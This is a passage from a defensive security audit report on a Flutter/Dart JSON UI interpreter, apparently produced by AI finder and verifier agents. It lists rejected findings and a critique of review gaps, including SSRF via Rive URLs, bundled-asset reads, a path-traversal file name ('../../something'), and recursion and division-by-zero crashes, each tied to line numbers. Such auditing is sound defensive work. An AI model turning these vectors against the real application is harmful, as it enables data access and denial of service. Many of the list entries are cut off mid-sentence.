- ~~Integer overflow / huge allocation in src-rect math from attacker tileset geometry (margin, spacing, columns, tilecount)~~ (`tiled_map_entity.dart:657-674, 722-727, 817-825`) — The code at lines 663-674, 722-727, 817-825 of tiled_map_entity.dart matches the description: margin/spacing/tileWidth/tileHeight/tileCount are parsed from untrusted tileset data without the clamp tha
- ~~Rive animation loads attacker-controlled URL with no scheme/host allowlist or size limit (SSRF + memory DoS)~~ (`rive_animation_widget.dart:152-159 (FileLoader.fromUrl), reached from 14-16 (src) and 123-145 (_load)`) — The cited code mechanism is literally present: json['src']??json['url']??json['asset'] (lines 14-16) -> resolveTemplate -> if http(s) prefix, passed verbatim to rive.FileLoader.fromUrl (lines 156-157)
- ~~Rive fromAsset path is fully attacker-controlled (asset probing / unintended bundle access)~~ (`rive_animation_widget.dart:156-159`) — Mechanism partially real: line 156-159 does pass the untrusted `src` (from json['src']/['url']/['asset'], line 14) unmodified to rive.FileLoader.fromAsset when it isn't an http(s) URL. So a JSON App c
- ~~@flame_game_input / @flame_game_reset fan out to every mounted game on the interpreter, not the targeted one~~ (`interpreter.dart:55-57, 1433-1455; registration at flame_game_widget.dart 154-157`) — The code mechanism is accurately described: `_flameGameResetters` and `_flameGameInputHandlers` (interpreter.dart:55-57) are flat per-interpreter lists; each `_FlameGameMountState.initState` registers
- ~~Image/shader src loads arbitrary attacker URLs (SSRF, unbounded download, no integrity check)~~ (`visual_primitives_widget.dart:431-434, 1608-1611`) — The cited mechanism is read correctly: visual_primitives_widget.dart:431-434 and 1608-1611 build NetworkImage(src) from attacker-controlled, resolveTemplate'd src with no allow-list/cap/integrity chec
- ~~Clip/path/projection coordinates accept NaN/Inf, corrupting the rasterizer~~ (`visual_primitives_widget.dart:616-619, 647-653, 684-728`) — The mechanism's first half is real but the claimed impact is not. CONFIRMED: `_resolveDouble` (visual_primitives_widget.dart:2973-2979) ends in `double.tryParse(resolved?.toString() ?? '')` with no fi
- ~~OverflowBox accepts unbounded/infinite max constraints from JSON~~ (`visual_primitives_widget.dart:862-875`) — The literal code reading is accurate: lib/json_ui/widgets/visual_primitives_widget.dart:862-875 passes minWidth/minHeight/maxWidth/maxHeight straight from _resolveDouble (line 2973, no clamping; defau
- ~~setVariable/notifyListeners runs after interpreter.dispose() → notify-after-dispose crash (lifecycle leak)~~ (`interpreter.dart:826-839 (setVariable/notifyListeners), 3894-3904 (dispose), 1347-1352 (@delay)`) — The individual code facts are real: setVariable (interpreter.dart:826-839) calls notifyListeners() with no _disposed/hasListeners guard; there is no _disposed flag in the file (grep confirms); @delay 
- ~~event[0] indexing in lifecycle key derivation will throw RangeError on an empty lifecycle event string~~ (`interpreter.dart:3865`) — The mechanism described is real: interpreter.dart:3865 computes the hook key as `'on${event[0].toUpperCase()}${event.substring(1)}'` with no empty-string guard, so `event[0]` would throw RangeError on
- ~~Non-URL Rive src is passed verbatim to FileLoader.fromAsset, allowing arbitrary bundled-asset read~~ (`rive_animation_widget.dart:159`) — Mechanism at /home/fish/ai-app/lib/json_ui/widgets/rive_animation_widget.dart:159 is accurately quoted: any src not starting with http(s):// is passed verbatim to rive.FileLoader.fromAsset, with no pr
- ~~RiveFile returned by FileLoader.file() is never disposed (lifecycle/memory leak)~~ (`rive_animation_widget.dart:129-145`) — The finding misreads the rive 0.14.x (rive_native-based) ownership model. In this API, FileLoader is the owner of the RiveFile it produces via file(); the documented disposal pattern is to dispose the
- ~~SemVer.parse silently coerces malformed/garbage versions to 0.0.0, weakening dependency constraint enforcement~~ (`semver.dart:12-20`) — The PARSING mechanism is real and correctly described: SemVer.parse at /home/fish/ai-app/lib/json_ui/semver.dart:12-20 uses `int.tryParse(parts[i]) ?? 0`, never throws, drops prerelease/build metadata
- ~~VersionConstraint.parse '^0.0.0' / huge-major caret produces incorrect or web-overflowing upper bound~~ (`semver.dart:64-87`) — The mechanism described is factually accurate as a correctness/semantics nit but is NOT a security finding, so I reject it.

Code confirmed at /home/fish/ai-app/lib/json_ui/semver.dart:64-87: caret do

---

## 6. 附录 B：完整性批判（第一轮后识别的盲区，已在第二轮补审）

```
I now have a clear, evidence-based picture of the gaps. The lifecycle listener uses the snapshot's `_config` after popState (reads `_config['global']['lifecycle']`), but during a nested launch the SAME listener fires against the child's config — confirming a cross-cutting state-isolation gap. I have enough to deliver the completeness critique.

COMPLETENESS GAPS — areas under-examined or missed by the findings so far. Each is grounded in code I read; line numbers are real.

1. `launcher_bridges.dart` — ENTIRELY UNREVIEWED (498 lines, 0 findings). This is the single biggest gap and it owns boundary-C (deep-link/launch) and host-access surface.
   - `@launch_app` push/pop state isolation is broken. `pushState()` (interpreter.dart:624-660) snapshots config/vars/functions/controllers/IM/loop stacks, but does NOT snapshot `_flameGameResetters` / `_flameGameInputHandlers` (lines 55-57), `_activeModalCount` (reset to 0 at 659, never restored to parent's value on pop — popState 665-713 never re-sets it), or the lifecycle listener. Hypothesis to confirm: a child JSON-App launched via `@launch_app` registers flame resetters that the parent's `@flame_game_reset` (interpreter.dart:1437) will still iterate after the child's widget unmounts but before `whenComplete`→`popState` runs — and conversely a parent's modal-dismiss counter is clobbered to 0, so parent `@dismiss_all` no longer closes parent modals. Category: state-corruption/lifecycle-leak, likely high.
   - `@launch_app` re-entrancy / unbounded nesting (launcher_bridges.dart:311-342). Nothing caps `_stateStack` depth. A JSON-App whose startup `steps` call `@launch_app` (kind=local pointing at itself, or two apps launching each other) pushes state and `executeSteps()` again → unbounded `_stateStack` growth + nested navigator routes = stack/heap DoS. Category: dos, high. No finding covers this; the recursion findings only cover `@global` functions, not cross-app launch recursion.
   - `_launchApp` calls `interpreter.loadConfig(config)` + `executeSteps()` on the SHARED interpreter with a config pulled from CacheManager/AppStorage with no integrity check (ties to the existing dependency-integrity finding but here it's the *app* entry path, and `kind:"market"` accepts any `name` with `^version` resolved by `preferLatest:true` — a downgrade/substitution vector). Confirm whether `name` is namespace-validated.
   - `@my_apps_share` (line 141-142) writes `'$tmp/$fileName'` with attacker-controlled `fileName` — path traversal into temp dir (`fileName: "../../something"`). Same class as the confirmed cache_manager traversal but in a second, unreviewed location. Category: host-access.
   - `@market_list` (line 170-178) and the rive/audio/tiled SSRF findings all point at the same systemic gap: there is NO central URL allowlist; every bridge re-implements raw `http.get`. Worth calling out that `AppConfig.registryUrl` is the only "trusted" host and nothing enforces it elsewhere.

2. Lifecycle listener vs. nested apps / reload (interpreter.dart:3856-3880). `_attachLifecycleListener` is attached once in the constructor and reads `_config['global']['lifecycle']` live. During a nested `@launch_app`, `_config` is the child's, so a system resume/pause fires the CHILD's `onResume` steps while the parent is suspended — and after `popState` swaps `_config` back, the listener silently switches to the parent's hooks. No finding owns this. Also confirm `loadConfig` re-calls `_attachLifecycleListener` (it does at 610-611 via the constructor path) — check for double-registration on reload of the same interpreter (the `_detachLifecycleListener()` at 3857 guards it, but verify `loadConfig` actually routes through it).

3. `@delay` (interpreter.dart:1347) and any timer-based built-in. There is no `_timers` collection and no cancellation on `popState`/dispose. Hypothesis: a `@delay` (or any future-scheduled step) started in a child app resolves AFTER `popState`, mutating the now-parent `_variables`/calling `notifyListeners()` — a race + cross-app state-corruption path. The existing `@parallel` race findings do not cover delayed/scheduled callbacks crossing an app boundary. Worth reading the full `@delay` impl and grepping for `Future.delayed`.

4. `rive_animation_widget.dart` — 0 findings. Two real issues: (a) `_createLoader` (line 156-159) fetches arbitrary attacker `http://`/`https://` URLs via `FileLoader.fromUrl` — same SSRF class as audio/tiled, uncovered here; (b) the `else` branch (line 159) calls `FileLoader.fromAsset(widget.src,...)` with an attacker-controlled non-URL `src` — arbitrary bundled-asset read, exactly mirroring the confirmed tiled_map_entity rootBundle finding but in the Rive widget. Category: ssrf-exfil + host-access.

5. `game_world.dart` — 0 findings. `resize()` (line 49-51) computes `cellW = w/cols`, `cellH = h/rows` with `cols`/`rows` taken straight from JSON (`fromJson` line 39-40, `(num).toInt()` with no floor/clamp). `cols:0` → division by zero → `cellW = Infinity`; `pixelToCell` (line 67-72) and `cellTopLeft`/`cellCenter` then propagate Infinity/NaN into `.floor()` → the same `UnsupportedError` crash class flagged for tiled tilewidth=0, but in the core world grid. Also `cols`/`rows` are unbounded → feeds the `value_grid` allocation finding from a second entry point. Category: type-crash/dos.

6. `flame_game_widget._dispatchEvent` (line 169-180) callback-after-dispose / leak. It registers resetter+input handlers in `initState` and removes them in `dispose` (good), but `addPostFrameCallback` schedules `executeActionWithEvent` on the OUTER interpreter; if the game emits an event in the same frame the widget is being torn down, the `mounted` check at 174 guards the widget but the action still runs against whatever `_config` the interpreter currently holds (which after a parent/child swap may be the wrong app). Cross-cutting "game callback fires into interpreter after app-context swap" — no finding owns the game↔interpreter action boundary.

7. `platformer_physics_backend.dart` (70 lines) and `semver.dart` (170 lines) — both 0 findings, unreviewed. semver is reachable from untrusted `dependencies`/`@launch_app version` via `VersionConstraint.parse('^$version')` (launcher_bridges:236). Hypothesis: malformed version strings (huge numeric components, deeply nested ranges, pathological regex) → parse crash or ReDoS. Worth a focused read of the parser/regex.

8. Boundary E (cross-app/global state) is thin overall. Beyond the push/pop holes above, check: registration leaks where `register*` has no matching `unregister` on the error path (e.g., if `_FlameGameMountState.initState` registers but a later `build` throws, or if two flame games on one screen both register and `unregister` removes by identity — `_flameGameResetters.remove(resetter)` at interpreter:87 removes by closure identity, fine, but confirm no list-grows-on-hot-reload). The `_flameGameResetters`/`_flameGameInputHandlers` lists are NOT cleared in `loadConfig`, so a reload that fails to dispose old mounts leaks stale closures that fire on the next `@flame_game_reset`.

Highest-value next steps: (1) fully audit `launcher_bridges.dart` `@launch_app` for nesting cap + state-snapshot completeness (missing fields: flame handler lists, `_activeModalCount`, lifecycle binding, pending `@delay` futures); (2) read `@delay`/`Future.delayed` for post-pop callbacks; (3) rive `fromUrl`/`fromAsset` SSRF+asset-read; (4) `game_world.resize` div-by-zero; (5) `semver` parser on hostile input.
```

---

## 7. 方法论与可复现性

- 第一轮（广度）：`expr-eval`、`builtins-actions`、`interp-design`、`network-ssrf`、`supply-chain`、`game-engine-core`、`game-actions`、`game-physics-maps`、`game-widget-glue`、`visual-primitives` 共 10 个 finder，各自全文精读所辖文件并产出结构化发现；每条发现交由一个**独立的对抗验证者**重读代码尝试驳回，校准严重度。
- 第二轮（补盲）：`launcher_bridges`（含 `@launch_app` 跨应用状态隔离、嵌套上限、`@my_apps_share` 路径穿越）、`@delay`/Timer 跨应用竞态、生命周期监听、Rive SSRF、`game_world` 除零、`semver` 解析、以及 `@get_auth_token` 外泄链 —— 同样 find → 对抗验证。
- 所有结论以实际代码行号为准；本报告由验证后的结构化数据**确定性生成**，避免转述失真。

